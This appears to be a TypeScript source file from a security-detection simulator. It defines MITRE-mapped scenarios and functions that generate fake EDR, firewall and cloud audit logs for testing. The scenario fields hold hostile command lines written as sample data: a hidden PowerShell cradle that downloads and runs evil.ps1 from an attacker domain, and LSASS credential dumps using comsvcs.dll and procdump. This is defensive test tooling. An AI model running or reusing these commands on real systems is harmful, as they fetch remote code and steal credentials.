    { "id": "sentinelone_001", "name": "SentinelOne - Word spawning PowerShell", "tactic": "TA0002 - Execution", "mitre_technique": "T1059.001", "dataSource": "SentinelOne DeepVisibility", "productType": "SentinelOne", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_sentinelone_log", "params": { "name": "SuspiciousProcess", "process_name": "powershell.exe", "process_commandline": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://{attacker_domain}/evil.ps1'))\"", "parent_process_name": "winword.exe", "hostname": "{victim_hostname}", "user": "{user_name}" } } },
    { "id": "sentinelone_002", "name": "SentinelOne - Credential Dumping via LSASS", "tactic": "TA0006 - Credential Access", "mitre_technique": "T1003.001", "dataSource": "SentinelOne DeepVisibility", "productType": "SentinelOne", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_sentinelone_log", "params": { "name": "LsassMemoryRead", "process_name": "rundll32.exe", "process_commandline": "rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump {random_int:500,1000} full C:\\\\temp\\\\lsass.dmp", "target_process_name": "lsass.exe", "hostname": "{victim_hostname}" } } },
    { "id": "mde_002", "name": "MDE - Suspicious WMI Execution", "tactic": "TA0002 - Execution", "mitre_technique": "T1047", "dataSource": "Microsoft Defender for Endpoint", "productType": "MDE", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_mde_log", "params": { "name": "WmiExec", "FileName": "WmiPrvSE.exe", "ProcessCommandLine": "wmic.exe process call create \"{file_name}\"", "InitiatingProcessFileName": "powershell.exe", "DeviceName": "{victim_hostname}", "victim_user": "{victim_user}", "hostname_domain": "{hostname_domain}" } } },
    { "id": "mde_003", "name": "MDE - ASR Credential Stealing block", "tactic": "TA0006 - Credential Access", "mitre_technique": "T1003.001", "dataSource": "Microsoft Defender for Endpoint", "productType": "MDE", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_mde_log", "params": { "name": "AsrLsassAccess", "ActionType": "AsrLsassAccessBlocked", "FileName": "procdump64.exe", "ProcessCommandLine": "procdump64.exe -ma lsass.exe C:\\\\temp\\\\lsass.dmp", "InitiatingProcessFileName": "cmd.exe", "DeviceName": "{victim_hostname}", "victim_user": "{victim_user}", "hostname_domain": "{hostname_domain}" } } },
    { "id": "mde_004", "name": "MDE - Scheduled Task Creation via Registry", "tactic": "TA0003 - Persistence", "mitre_technique": "T1053.005", "dataSource": "Microsoft Defender for Endpoint", "productType": "MDE", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_mde_log", "params": { "name": "ScheduledTaskRegistry", "ActionType": "RegistryValueSet", "FileName": "svchost.exe", "InitiatingProcessFileName": "powershell.exe", "DeviceName": "{victim_hostname}", "victim_user": "{victim_user}", "RegistryKey": "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tree\\\\Malicious Task", "RegistryValueName": "Path", "RegistryValueData": "\\\\Malicious Task" } } },
    { "id": "mde_005", "name": "MDE - Malicious File Drop", "tactic": "TA0011 - Command and Control", "mitre_technique": "T1105", "dataSource": "Microsoft Defender for Endpoint", "productType": "MDE", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_mde_log", "params": { "name": "FileCreated", "ActionType": "FileCreated", "FileName": "{file_name}", "FolderPath": "C:\\\\Users\\\\{victim_user}\\\\Downloads\\\\", "InitiatingProcessFileName": "chrome.exe", "DeviceName": "{victim_hostname}", "victim_user": "{victim_user}" } } },
    { "id": "sentinelone_003", "name": "SentinelOne - Ransomware Behavior Detected", "tactic": "TA0040 - Impact", "mitre_technique": "T1486", "dataSource": "SentinelOne DeepVisibility", "productType": "SentinelOne", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_sentinelone_log", "params": { "name": "RansomwareActivity", "threat_name": "Generic.Ransomware.A", "process_name": "{file_name}", "process_commandline": "\"{file_name}\" --encrypt C:\\Users\\{victim_user}\\Documents", "parent_process_name": "explorer.exe", "hostname": "{victim_hostname}", "user": "{victim_user}", "encrypted_file_count": "{random_int:500,2000}", "ransom_note_filename": "READ_ME_FOR_DECRYPTION.txt", "behavior_summary": "Process deleted shadow copies, exhibited high-rate file encryption, and dropped a ransom note." } } },
    { "id": "cortex_xdr_001", "name": "Cortex XDR - LSASS Memory Dumping Detected", "tactic": "TA0006 - Credential Access", "mitre_technique": "T1003.001", "dataSource": "Cortex XDR Agent", "productType": "Cortex XDR", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_cortex_xdr_log", "params": { "name": "LsassMemoryRead", "event_type": "PROCESS_EXECUTION", "agent_hostname": "{victim_hostname}", "agent_ip_addresses": ["{victim_ip}"], "actor_process_image_path": "C:\\\\Windows\\\\System32\\\\rundll32.exe", "actor_process_command_line": "rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump {random_int:500,1000} full C:\\\\temp\\\\lsass.dmp", "causality_actor_process_image_path": "C:\\\\Windows\\\\System32\\\\cmd.exe", "actor_user_name": "{victim_user}" } } },
    { "id": "cortex_xdr_002", "name": "Cortex XDR - PowerShell Image Load", "tactic": "TA0002 - Execution", "mitre_technique": "T1059.001", "dataSource": "Cortex XDR Agent", "productType": "Cortex XDR", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_cortex_xdr_log", "params": { "name": "PowerShell Execution", "event_type": "LOAD_IMAGE", "agent_hostname": "{victim_hostname}", "agent_ip_addresses": ["{victim_ip}"], "actor_process_image_path": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "module_path": "System.Management.Automation.dll", "actor_user_name": "{victim_user}" } } },
    { "id": "cortex_xdr_003", "name": "Cortex XDR - Ransomware Behavior Detected", "tactic": "TA0040 - Impact", "mitre_technique": "T1486", "dataSource": "Cortex XDR Agent", "productType": "Cortex XDR", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_cortex_xdr_log", "params": { "name": "Ransomware Behavior", "event_type": "BEHAVIORAL_ALERT", "agent_hostname": "{victim_hostname}", "agent_ip_addresses": ["{victim_ip}"], "actor_process_image_path": "C:\\\\Users\\\\{victim_user}\\\\Downloads\\\\{file_name}", "actor_process_command_line": "\"{file_name}\" --encrypt", "actor_user_name": "{victim_user}", "action_pretty": "Ransomware protection", "causality_actor_process_image_path": "C:\\\\Windows\\\\explorer.exe", "description": "Ransomware-like behavior was detected: a process performed mass-encryption of files on the endpoint. The malicious process was terminated.", "severity": "High" } } },
    { "id": "cortex_xdr_004", "name": "Cortex XDR - WMI Execution", "tactic": "TA0002 - Execution", "mitre_technique": "T1047", "dataSource": "Cortex XDR Agent", "productType": "Cortex XDR", "domain": "Endpoint", "simulation": { "type": "single", "generator": "gen_cortex_xdr_log", "params": { "name": "WMI Process Execution", "event_type": "PROCESS_EXECUTION", "agent_hostname": "{victim_hostname}", "agent_ip_addresses": ["{victim_ip}"], "actor_process_image_path": "C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe", "actor_process_command_line": "wmic.exe process call create \\\"C:\\\\temp\\\\{file_name}\\\"", "causality_actor_process_image_path": "C:\\\\Windows\\\\System32\\\\svchost.exe", "actor_user_name": "NT AUTHORITY\\\\SYSTEM" } } }
];

export const DETECTIONS_BY_ID = DETECTIONS_LIBRARY.reduce((acc, detection) => {
    acc[detection.id] = detection;
    return acc;
}, {} as Record<string, Detection>);


// Log Generator Functions
// Reference for log samples and schema inspiration: https://github.com/d4rk-d4nph3/Windows-Event-Samples

export const gen_azure_ad_audit_log = (params: Record<string, any>): Record<string, any> => {
    const timestamp = new Date().toISOString();
    return {
        "time": timestamp,
        "operationName": params.operationName,
        "result": params.result,
        "initiatedBy": {
            "user": {
                "userPrincipalName": params.initiatedBy_user_userPrincipalName
            }
        },
        "targetResources": [
            {
                "displayName": params.targetResources_0_displayName,
                "modifiedProperties": params.targetResources_0_modifiedProperties_0_displayName 
                    ? [{"displayName": params.targetResources_0_modifiedProperties_0_displayName}] 
                    : []
            }
        ],
        "category": "AuditLogs",
        "properties": params,
    };
};

// Generates a GCP Audit Log JSON object.
// Reference: https://cloud.google.com/logging/docs/audit#audit_log_record_fields
export const gen_gcp_audit_log = (params: Record<string, any>): Record<string, any> => {
    const timestamp = new Date().toISOString();
    return {
        "protoPayload": {
            "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
            "status": {},
            "authenticationInfo": {
                "principalEmail": params.principalEmail
            },
            "requestMetadata": {
                "callerIp": "{attacker_ip}",
                "callerSuppliedUserAgent": "gcloud/433.0.0",
            },
            "serviceName": params.serviceName,
            "methodName": params.methodName,
            "resourceName": params.resourceName,
            "request": {
                "resource": params.resourceName,
                "policy": {
                    "bindings": [ { "role": params.role, "members": [ params.member ] } ]
                }
            }
        },
        "insertId": `-${Array(6).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}`,
        "resource": {
            "type": "service_account",
            "labels": {
                "project_id": "{hostname_domain}",
                "unique_id": randomInt(1000,9999).toString(),
                "email_id": "{app_name}@{hostname_domain}.iam.gserviceaccount.com"
            }
        },
        "timestamp": timestamp,
        "severity": "NOTICE",
        "logName": `projects/{hostname_domain}/logs/cloudaudit.googleapis.com%2Factivity`,
        "receiveTimestamp": timestamp,
        "original_params": params
    };
};

// Generates an Azure Activity Log JSON object.
// Reference: https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log-schema
export const gen_azure_activity_log = (params: Record<string, any>): Record<string, any> => {
    const timestamp = new Date().toISOString();
    const correlationId = `c${randomInt(100,999)}c${randomInt(100,999)}-${randomInt(100,999)}-${randomInt(100,999)}-${randomInt(100,999)}-${randomInt(100000,999999)}`;
    return {
        "correlationId": correlationId,
        "eventDataId": `e${randomInt(100,999)}e${randomInt(100,999)}-${randomInt(100,999)}-${randomInt(100,999)}-${randomInt(100,999)}-${randomInt(100000,999999)}`,
        "eventName": { "value": params.operationName, "localizedValue": params.operationName.split('/').pop() },
        "category": { "value": "Administrative", "localizedValue": "Administrative" },
        "eventTimestamp": timestamp,
        "resourceGroupName": params.resourceGroupName,
        "resourceProviderName": { "value": params.resourceProvider, "localizedValue": params.resourceProvider },
        "resourceType": { "value": `${params.resourceProvider}/${params.resourceType}`, "localizedValue": `${params.resourceProvider}/${params.resourceType}` },
        "resourceId": `/subscriptions/${params.subscriptionId}/resourceGroups/${params.resourceGroupName}/providers/${params.resourceProvider}/${params.resourceType}/${params.resourceName}`,
        "status": { "value": "Succeeded", "localizedValue": "Succeeded" },
        "subscriptionId": params.subscriptionId,
        "caller": params.caller,
        "properties": {
            "entity": `/subscriptions/${params.subscriptionId}/resourceGroups/${params.resourceGroupName}/providers/${params.resourceProvider}/${params.resourceType}/${params.resourceName}`,
            "message": `${params.operationName} succeeded.`,
            "details": "Public IP attached to NIC.",
        },
        "original_params": params
    };
};


export const gen_mde_log = (params: Record<string, any>): Record<string, any> => {
    const timestamp = new Date().toISOString();
    const deviceId = `device-id-${randomInt(1000, 9999)}`;
    const reportId = randomInt(100000, 999999);
    const sha1 = Array(40).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
    const parentSha1 = Array(40).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
    const sha256 = Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
    const parentSha256 = Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');


    // Base object with common fields
    const logObject: Record<string, any> = {
        "Timestamp": timestamp,
        "ReportId": reportId,
        "DeviceId": deviceId,
        "DeviceName": params.DeviceName,
        "ActionType": params.ActionType || "ProcessCreated",
        "AccountDomain": params.hostname_domain || "WORKGROUP",
        "AccountName": params.victim_user || "system",
        "original_params": params,
    };

    // Fields for process-related events
    if (params.FileName) {
        Object.assign(logObject, {
            "FileName": params.FileName,
            "FolderPath": params.FolderPath || `C:\\Windows\\System32\\${params.FileName}`,
            "SHA1": sha1,
            "SHA256": sha256,
        });
    }

    if (params.ActionType === 'ProcessCreated' || params.ActionType === 'AsrLsassAccessBlocked') {
         Object.assign(logObject, {
            "ProcessId": randomInt(1000, 9999),
            "ProcessCommandLine": params.ProcessCommandLine,
         });
    }

    if (params.InitiatingProcessFileName) {
        Object.assign(logObject, {
            "InitiatingProcessId": randomInt(1000, 9999),
            "InitiatingProcessFileName": params.InitiatingProcessFileName,
            "InitiatingProcessFolderPath": params.InitiatingProcessFolderPath || `C:\\Windows\\System32\\${params.InitiatingProcessFileName}`,
            "InitiatingProcessSHA1": parentSha1,
            "InitiatingProcessSHA256": parentSha256,
            "InitiatingProcessAccountDomain": params.InitiatingProcessAccountDomain || params.hostname_domain || "WORKGROUP",
            "InitiatingProcessAccountName": params.InitiatingProcessAccountName || params.victim_user || "system",
        });
    }

    // Fields for file events
    if (params.ActionType === 'FileCreated') {
        Object.assign(logObject, {
            "FilePath": `${params.FolderPath}${params.FileName}`
        });
    }
    
    // Fields for registry events
    if (params.ActionType === 'RegistryValueSet') {
        Object.assign(logObject, {
           "RegistryKey": params.RegistryKey,
           "RegistryValueName": params.RegistryValueName,
           "RegistryValueData": params.RegistryValueData,
        });
    }


    // Fields for malware detection
    if (params.ActionType === 'AntivirusDetection') {
        Object.assign(logObject, {
            "ThreatName": params.ThreatName || "Trojan:Win32/Wacatac.B!ml",
            "ThreatFamily": params.ThreatFamily || "Wacatac",
            "Severity": params.Severity || "High",
            "DetectionSource": "Antivirus",
        });
    }

    // Fields for ASR rules
    if (params.ActionType?.startsWith('Asr')) {
        Object.assign(logObject, {
            "AdditionalFields": {
                "RuleId": params.RuleId || "be9ba2d9-53ea-4cdc-84e5-9b1eeee46550", // Block credential stealing from LSASS
                "RuleName": params.RuleName || "Block credential stealing from the Windows local security authority subsystem (lsass.exe)",
            },
        });
    }

    // Fields for anomalous user behavior (e.g., unusual logon)
    if (params.ActionType === 'LogonSuccess' && params.isAnomalous) {
         Object.assign(logObject, {
            "LogonType": params.LogonType || "Interactive",
            "IsLocalAdmin": params.IsLocalAdmin || false,
            "RemoteIP": params.RemoteIP,
            "RemoteDeviceName": params.RemoteDeviceName,
            "AdditionalFields": {
                "IsAnomalous": "True"
            }
         });
    }

    return logObject;
};

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "curl/7.81.0",
    "Wget/1.21.3",
    "python-requests/2.28.1"
];

// Generates a Zscaler log as a structured object for CEF formatting.
export const gen_zscaler_log = (params: Record<string, any>): Record<string, any> => {
    const now = new Date();
    const user = params.user || "d.evans";
    const src_ip = params.source_ip || "172.17.3.49";
    const dest_ip = params.dest_ip || "1.2.3.4";
    const urlCategory = params.url_category || "File Sharing";
    const responseBytes = params.total_bytes || "128";
    const sentBytes = params.sent_bytes || "512";
    const action = params.action === 'allowed' ? 'Allowed' : 'Blocked';
    const httpMethod = params.httpMethod || 'POST';

    let statusCode: string;
    if (action === 'Blocked') {
        statusCode = '403';
    } else {
        switch (httpMethod.toUpperCase()) {
            case 'POST': statusCode = '200'; break;
            case 'PUT': statusCode = '201'; break;
            case 'GET': statusCode = '200'; break;
            default: statusCode = '204';
        }
    }

    const userAgent = params.userAgent || USER_AGENTS[randomInt(0, USER_AGENTS.length - 1)];
    const threatCategory = params.threat_category || "Data Leakage";
    const threatClass = params.threat_class || "Suspicious Destination";

    return {
        datetime: now.toString(),
        proxy: "zscaler-proxy-sjc1",
        proto: "HTTPS",
        request: (params.url || 'evil.net').replace(/https?:\/\//, ''),
        act: action,
        threatcat: threatCategory,
        urlclass: urlCategory,
        requestsize: sentBytes,
        responsesize: responseBytes,
        suser: user,
        dept: "Default Department",
        src: src_ip,
        dst: dest_ip,
        requestMethod: httpMethod,
        responseCode: statusCode,
        requestClientApplication: userAgent,
        threatname: threatCategory,
        rulelabel: "FwFilter",
        ruletype: "Firewall_1",
        appclass: "Other",
        appname: "None",
        fileclass: "N/A",
        original_params: params,
    };
};


// Generates a Microsoft Defender for Identity extensions object for CEF formatting.
// Reference: https://learn.microsoft.com/en-us/defender-for-identity/cef-format-sa
export const gen_defender_for_identity_log = (params: Record<string, any>): Record<string, any> => {
    // This function now returns a simple object. The createCefLog function in the simulation service
    // will handle the full CEF string construction, including the header.
    // We pass all params through, as they will become the CEF extensions.
    // The formatter will intelligently use params.name, params.signatureId, and params.severity for the CEF header.
    return {
        ...params,
        start: new Date().getTime(),
    };
};

// Generates a Cisco Meraki IDS alert as a structured object for CEF formatting.
export const gen_meraki_ids_alert_log = (params: Record<string, any>): Record<string, any> => {
    const merakiDeviceIp = params.meraki_ip || '192.168.1.1';
    
    return {
        deviceIp: merakiDeviceIp,
        eventType: 'ids-alert',
        signature: params.signature || '1:2010935:6',
        priority: params.priority || '1',
        classification: params.classification || 'Potentially Bad Traffic',
        direction: params.direction || 'ingress',
        src: `${params.src_ip}:${params.src_port}`,
        dst: `${params.dst_ip}:${params.dst_port}`,
        msg: params.message || 'ET POLICY PE EXE or DLL Windows file download HTTP for url {attacker_domain}/{file_name}',
        original_params: params,
    };
};

// Generates a Cisco ASA log as a structured object for CEF formatting.
export const gen_cisco_asa_log = (params: Record<string, any>): Record<string, any> => {
    const msgCode = '302014'; // Teardown TCP connection
    const severity = '6'; // Informational
    const connectionId = randomInt(10000, 99999);
    const src_ip = params.src_ip || '10.1.1.1';
    const dest_ip = params.dest_ip || '8.8.8.8';
    const src_port = params.src_port || randomInt(49152, 65535);
    const dest_port = params.dest_port || '443';
    const duration = `0:00:${randomInt(10, 59)}`;
    const bytes = randomInt(100, 5000);
    const protocol = params.protocol || 'TCP';

    return {
        msgCode,
        severity,
        connectionId,
        src: src_ip,
        dst: dest_ip,
        spt: src_port,
        dpt: dest_port,
        duration,
        bytes,
        proto: protocol,
        msg: `Teardown ${protocol} connection ${connectionId} for outside:${dest_ip}/${dest_port} to inside:${src_ip}/${src_port} duration ${duration} bytes ${bytes} TCP FINs`,
        original_params: params,
    };
};

// Generates a Fortinet FortiGate log as a structured object for CEF formatting.
export const gen_fortinet_fortigate_log = (params: Record<string, any>): Record<string, any> => {
    const now = new Date();
    
    return {
        date: now.toISOString().split('T')[0],
        time: now.toTimeString().split(' ')[0],
        logid: "0316013052",
        type: "utm",
        subtype: "webfilter",
        eventtype: "ftgd_blk",
        level: "warning",
        vd: "root",
        eventtime: Math.floor(now.getTime() / 1000),
        srcip: params.src_ip || '10.1.1.1',
        srcport: randomInt(49152, 65535),
        srcintf: "port10",
        srcintfrole: "lan",
        dstip: params.dest_ip || '8.8.8.8',
        dstport: params.dest_port || 443,
        dstintf: "port1",
        dstintfrole: "wan",
        policyid: randomInt(1, 20),
        sessionid: randomInt(10000, 99999),
        user: params.user || 'unknown',
        action: params.action || 'blocked',
        proto: 6,
        service: "HTTPS",
        hostname: params.hostname || 'evil.com',
        cat: 26, // Malicious Websites category
        catdesc: params.catdesc || 'Malicious Websites',
        url: params.url || '/',
        sentbyte: params.sentbyte || randomInt(100, 1000),
        rcvdbyte: params.rcvdbyte || randomInt(1000, 5000),
        msg: params.msg || 'URL has been blocked by FortiGuard Web Filter.',
    };
};

// Generates a Palo Alto Networks PAN-OS log as a structured object for CEF formatting.
export const gen_panos_log = (params: Record<string, any>): Record<string, any> => {
    const now = new Date();
    const generatedTime = now.toISOString();
    const log_type = params.log_type || 'TRAFFIC';

    const baseLog = {
        receive_time: now.toLocaleString('en-US', { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).replace(',', ''),
        serial: params.serial || '007051000012345',
        type: log_type.toUpperCase(),
        subtype: params.subtype || (log_type === 'TRAFFIC' ? 'end' : 'vulnerability'),
        time_generated: generatedTime,
        src: params.src || '1.1.1.1',
        dst: params.dst || '2.2.2.2',
        rule: params.rule_name || (log_type === 'TRAFFIC' ? 'allow-all' : 'threat-prevention-policy'),
        suser: params.user || 'unknown',
        app: params.app || 'ssl',
        vsys: params.vsys || 'vsys1',
        from: params.from_zone || 'trust',
        to: params.to_zone || 'untrust',
        inbound_if: params.inbound_if || 'ethernet1/1',
        outbound_if: params.outbound_if || 'ethernet1/2',
        sessionid: params.session_id || randomInt(10000, 99999).toString(),
        repeatcnt: params.repeat_count || '1',
        spt: params.spt || randomInt(49152, 65535).toString(),
        dpt: params.dpt || '443',
        proto: params.proto || 'tcp',
        action: params.action || 'allow'
    };
    
    if (log_type.toUpperCase() === 'TRAFFIC') {
        const bytes = params.bytes || randomInt(100, 5000).toString();
        const bytes_sent = params.bytes_sent || Math.floor(parseInt(bytes) * 0.8).toString();
        const bytes_received = params.bytes_received || (parseInt(bytes) - parseInt(bytes_sent)).toString();
        
        return {
            ...baseLog,
            bytes: bytes,
            sent: bytes_sent,
            rcvd: bytes_received,
            packets: params.packets || randomInt(1, 50).toString(),
            start: generatedTime, // starttime
            elapsed: '0',
            category: params.category || 'any',
        };
    }

    if (log_type.toUpperCase() === 'THREAT') {
        return {
            ...baseLog,
            misc: params.url || '', // misc (URL or filename)
            threatid: params.threat_id || '99999',
            category: params.category || 'any',
            severity: params.severity || 'medium',
            direction: params.direction || 'client-to-server',
            threat_name: params.threat_name || 'Generic Threat',
        };
    }

    // Fallback for unknown type
    return { error: `Unsupported PAN-OS log type: ${log_type}` };
};

export const gen_sentinelone_log = (params: Record<string, any>): Record<string, any> => {
    const timestamp = new Date().toISOString();
    // Mimic some realistic S1 fields.
    return {
        "event.time": timestamp,
        "agent.id": `agent-${randomInt(100000, 999999)}`,
        "agent.machine.name": params.hostname || "desktop-charlie",
        "user.name": params.user || "system",
        "process.name": params.process_name,
        "process.cmdline": params.process_commandline,
        "process.parent.name": params.parent_process_name,
        "tgt.process.name": params.target_process_name,
        "threat.name": params.threat_name,
        "threat.status": "mitigated",
        "custom.encrypted_files": params.encrypted_file_count,
        "custom.ransom_note": params.ransom_note_filename,
        "custom.behavior": params.behavior_summary,
        "original_params": params,
    };
};

export const gen_cortex_xdr_log = (params: Record<string, any>): Record<string, any> => {
    const timestamp = new Date().getTime(); // Cortex wants epoch ms
    return {
        "event_type": params.event_type || "PROCESS_EXECUTION",
        "event_sub_type": params.event_sub_type || "Create",
        "event_timestamp": timestamp,
        "agent_hostname": params.agent_hostname,
        "agent_ip_addresses": params.agent_ip_addresses,
        "agent_os_type": "Windows",
        "actor_process_image_path": params.actor_process_image_path,
        "actor_process_command_line": params.actor_process_command_line,
        "actor_process_os_pid": randomInt(1000, 9999),
        "actor_process_image_sha256": Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join(''),
        "actor_process_signature": "Signed",
        "actor_process_signature_vendor": "Microsoft Corporation",
        "actor_user_name": params.actor_user_name,
        "causality_actor_process_image_path": params.causality_actor_process_image_path,
        "causality_actor_process_command_line": params.causality_actor_process_image_path, // often just the exe name
        "causality_actor_process_os_pid": randomInt(1000, 9999),
        "original_params": params, // for debugging
    };
};

// Generates a generic M365 audit log based on the Office 365 Management Activity API schema.
export const gen_m365_audit_log = (params: Record<string, any>): Record<string, any> => {
    const timestamp = new Date().toISOString();
    return {
        "CreationTime": timestamp,
        "Id": `a1b2c3d4-e5f6-g7h8-i9j0-${randomInt(100000, 999999)}`,
        "Operation": params.Operation,
        "OrganizationId": `o1b2c3d4-e5f6-g7h8-i9j0-k1l2m3n4o5p6`,
        "RecordType": 9, // SharePoint or other
        "UserKey": `i:0h.f|membership|{random_int:1000,9999}@live.com`,
        "UserType": 0, // Regular
        "Version": 1,
        "Workload": "SharePoint",
        "ClientIP": params.ClientIP,
        "ObjectId": params.ObjectId,
        "UserId": params.UserId,
        "AuditData": JSON.stringify({
            // For SharePoint sharing
            "SharingType": params.SharingType,
            "SiteUrl": params.SiteUrl,
            // For Mailbox rules
            "Parameters": params.Parameters,
            // For SafeLinks
            "Url": params.Url,
            "Action": params.Action,
        }),
        "original_params": params,
    };
};